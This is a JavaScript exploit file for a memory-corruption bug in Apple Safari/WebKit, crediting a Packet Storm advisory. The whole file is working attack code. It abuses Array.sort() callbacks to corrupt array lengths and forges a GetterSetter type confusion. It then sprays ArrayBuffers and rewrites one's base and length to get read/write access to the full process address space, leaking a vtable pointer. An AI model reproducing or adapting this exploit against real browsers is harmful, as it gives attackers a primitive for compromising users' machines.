/*
    This file contains the 'exploit' which is heavily based on
    http://packetstormsecurity.com/files/123089/Packet-Storm-Advisory-2013-0903-1-Apple-Safari-Heap-Buffer-Overflow.html    
*/

/*
    Corrupt memory and setup an Uint8Array that represents
    the whole address space of the process.
*/
function initMemoryHole()
{
    try {
        /* 
           .sort() vuln c/p
-------------------------------------------------------------------------------
        */
        logdbg("Initialization");
        var u32 = new Uint32Array(8);
        var a1 = [0,1,2,3,u32];
        var a2 = [0,1,2,3,4]; // right after a1
        var a1len = a1.length;
        var a2len = a2.length;
        var u32len = u32.length;

        if (!_gc) _gc = new Array();
        _gc.push(u32,a1,a2);

        var myCompFunc = function(x,y)
        {
            if (y == 3 && x == u32) {
                a1.shift();
            }
            return 0;
        }

        a1.sort(myCompFunc);

        var u32addr = a2.length;
        if (u32addr == a2len) { logAdd("error: 1"); return -1; }


        myCompFunc = function(x,y)
        {
            if (y == 0 && x == 1) {
                a1.length = a1len;
                a1.shift();
                a2.length = u32addr + 0x28;
            }
            if (y == 3) {
                a1.unshift(0);
            }
            return 0;
        }

        a1.sort(myCompFunc);

        var c = a2.length;
        if (c != u32addr + 0x28) { logAdd("error: 2"); a1[3] = 0; return -1; }

        var mo = {};
        var pd = { get: function(){return 0;}, set: function(arg){return 0;}, enumerable:true, configurable:true }
        var a3 = [0,1,2,a1[3]];

        Object.defineProperty(mo, "prop0", pd);
        for(var i=1; i < 7; i++){
            mo["prop"+i] = i;
        }

        _gc.push(a3,mo,pd);

        myCompFunc = function(x,y)
        {
            if (y == 2) {
                a3.shift();
            }
            return 0;
        }

        a3.sort(myCompFunc);
        a1[3] = 0; a3[3] = 0;

        // setup GetterSetter
        u32.prop1 = 8;  // 8 = JSType.GetterSetterType
        u32.prop2 = 8;
        u32.prop3 = 8;
        u32.prop4 = u2d(u32addr, u32addr+0x10); // ((GetterSetter)mo.prop0).m_structure

        var f = new Function(" return 876543210 + " + (_cnt++) + ";");
        f.prop2 = u2d(0x40000000,0x40000000); // a new value for u32.length
        f();
        pd.get = f;
        Object.defineProperty(mo, "prop0", pd);
        delete mo.prop0;

        if (u32.length == u32len) { logAdd("error: 3"); return -1; }
        /*
-------------------------------------------------------------------------------
         */

        /* 
           Spray memory with ArrayBuffers that will be used to get
           arbitrary read/write 
        */
        var spraysiz = 0x1000
        logdbg("Spraying...");

        sprays = new Array(spraysiz);
        _gc.push(sprays);
        for(var o = 0; o < spraysiz; o++){
            buf = new ArrayBuffer(0xABC0);
            _gc.push(buf);
            sprays[o] = buf;
        }
        logdbg("Done spraying");

        /*
           Find a one of the sprayed ArrayBuffer objects in memory
           by looking for the size of the object
        */
        var idx = -1;       // index in u32 to size of object
        var baseaddr = -1;  // base address of object
        logdbg("Searching for signature...");
        for(var j = 0x0; j < 0x40000; j++){
            if((j % (0x10000)) == 0){
                logdbg("...");
            }
            if(u32[j] == 0xABC0){
                baseaddr = u32[j-1];
                idx = j;
                logdbg("Found signature at u32[0x" + idx.toString(16) + "] -> 0x" + baseaddr.toString(16));
                break;
            }
        }
        if(idx == -1){
            logdbg("Did not find signature");
            return -1;
        }

        /*
           Change the size of the object then scan the array of
           sprayed objects to find an object whose size has been change
        */
        var oldval = u32[idx].toString(16);
        u32[idx] = 0xdeadbabe;
        logdbg("Changing size of object: 0x" + oldval + " -> 0x" + u32[idx].toString(16));

        logdbg("Looking for modified object...");
        var arrobj = -1;
        for(var l = 0; l < spraysiz; l++){
            var t = sprays[l];
            if(t.byteLength == 0xdeadbabe){
                arrobj = t;
                logdbg("Found modified object at sprays[0x" + l.toString(16) + "]");
            }
        }

        if(arrobj == -1){
            logdbg("Did not find modified object");
            return -1;
        }

        
        // Get base address of u32
        // (ArrayBufferView.m_baseAddress)
        var u32base = u32[0x40000000-2];
        logdbg("u32 base: 0x" + u32base.toString(16));
        logdbg("u32 address: 0x" + u32addr.toString(16));

        // set base address to 0x0 and length to almost MAX_INT 
        u32[idx - 1] = 0x0;
        u32[idx] = 0xfffffff0;
        var aspace = new Uint8Array(arrobj);
        var aspace32 = new Uint32Array(arrobj);

        var vtab = aspace32[(u32addr / 4)];
        logdbg("vtab of u32: 0x" + vtab.toString(16));
        leakedptr = aspace32[((vtab + 0x48)/ 4)]; 
        logdbg("leaked ptr: 0x" + leakedptr.toString(16));

        return aspace;
    }
    catch(e) {
        logdbg("Error: " + e);
        return -1;
    }

    return -1;
}
